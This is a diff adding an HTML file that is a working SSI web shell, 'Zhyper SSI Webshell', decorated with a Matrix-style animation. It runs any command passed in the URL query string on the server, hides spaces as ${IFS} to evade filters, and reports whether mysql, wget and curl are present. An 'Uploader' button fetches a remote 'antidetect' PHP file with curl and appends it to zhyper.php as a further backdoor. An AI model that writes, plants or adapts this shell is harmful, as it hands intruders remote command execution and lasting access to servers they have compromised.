@@ -1,0 +1,166 @@
+<!--#config errmsg="Function SSI Disabled"-->
+<!--#set var="zero" value="" -->
+<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
+<!--#set var="shl" value="id" -->
+<!--#else -->
+<!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
+<!--#endif -->
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Zhyper SSI Webshell</title>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+  <style type="text/css">
+    html, body {
+      margin: 0;
+      padding: 0;
+      font-family: Courier, monospace;
+      height: 100%;
+      overflow: hidden;
+      color: #00FF00;
+    }
+
+    canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: -1;
+    }
+
+    .container {
+      position: relative;
+      z-index: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: rgba(0, 0, 0, 0.6);
+      padding: 20px;
+      border-radius: 15px;
+      box-shadow: 0 0 20px #00FF00;
+      text-align: center;
+    }
+
+    .input {
+      background: transparent;
+      border: 1px solid #00FF00;
+      color: #00FF00;
+      padding: 6px;
+      width: 70%;
+      margin-bottom: 10px;
+    }
+
+    button {
+      background: #00FF00;
+      border: none;
+      color: #000;
+      padding: 6px 12px;
+      margin-left: 5px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    .terminal {
+      background: #000;
+      color: #0f0;
+      padding: 15px;
+      margin-top: 20px;
+      border-radius: 10px;
+      text-align: left;
+      max-height: 400px;
+      overflow: auto;
+      font-size: 14px;
+      width: 100%;
+    }
+  </style>
+  <script>
+    function nezcmd() {
+      var uri = document.getElementById('command').value;
+      var rep = uri.replace(/[ ]/g, '${IFS}');
+      document.location.href = "<!--#echo var=DOCUMENT_NAME -->?" + encodeURI(rep);
+    }
+
+    function addupload() {
+      document.location.href = "<!--#echo var=DOCUMENT_NAME -->?" + "curl${IFS}-Ls${IFS}raw.githubusercontent.com/philuxkeras/newera/refs/heads/main/anon_antidetect.php${IFS}|${IFS}tee${IFS}-a${IFS}zhyper.php";
+    }
+
+    window.onload = function () {
+      var cmd = document.getElementById("cmd").innerHTML.split("${IFS}").join(" ");
+      document.getElementById("cmd").innerHTML = cmd;
+      var gaskan = document.getElementById("command");
+      gaskan.addEventListener("keyup", function (event) {
+        if (event.keyCode === 13) {
+          event.preventDefault();
+          document.getElementById("gas").click();
+        }
+      });
+    }
+  </script>
+</head>
+<body>
+<canvas id="matrixCanvas"></canvas>
+
+<div class="container">
+  <h1>Zhyper SSI Webshell</h1>
+  <p><b>System:</b> <!--#exec cmd="{uname,-nrv}" --> <br>
+     <b>Document Root:</b> <!--#echo var=DOCUMENT_ROOT --></p>
+  <p>
+    MySQL: <b><!--#exec cmd="{test,-e,/usr/bin/mysql}&&{echo,ON}||{echo,OFF}" --></b> |
+    Wget: <b><!--#exec cmd="{test,-e,/usr/bin/wget}&&{echo,ON}||{echo,OFF}" --></b> |
+    Curl: <b><!--#exec cmd="{test,-e,/usr/bin/curl}&&{echo,ON}||{echo,OFF}" --></b>
+  </p>
+
+  <input type="text" id="command" class="input" placeholder="Enter command">
+  <div>
+    <button id="gas" onclick="nezcmd();">Execute</button>
+    <button onclick="addupload();">Uploader</button>
+  </div>
+
+  <p>Executed Command: <b id="cmd"><!--#echo var=shl --></b></p>
+  <div class="terminal">
+    <pre><!--#exec cmd=$shl --></pre>
+  </div>
+</div>
+
+<script>
+  const canvas = document.getElementById('matrixCanvas');
+  const ctx = canvas.getContext('2d');
+
+  canvas.height = window.innerHeight;
+  canvas.width = window.innerWidth;
+
+  const letters = "01日ﾊﾐﾋｰｳｼﾅﾓ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+  const fontSize = 14;
+  const columns = canvas.width / fontSize;
+
+  const drops = Array.from({ length: columns }).fill(1);
+
+  function draw() {
+    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+    ctx.fillStyle = "#0F0";
+    ctx.font = fontSize + "px monospace";
+
+    for (let i = 0; i < drops.length; i++) {
+      const text = letters.charAt(Math.floor(Math.random() * letters.length));
+      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+      if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+        drops[i] = 0;
+      }
+
+      drops[i]++;
+    }
+  }
+
+  setInterval(draw, 33);
+
+  window.onresize = () => {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+  };
+</script>
+</body>
+</html>
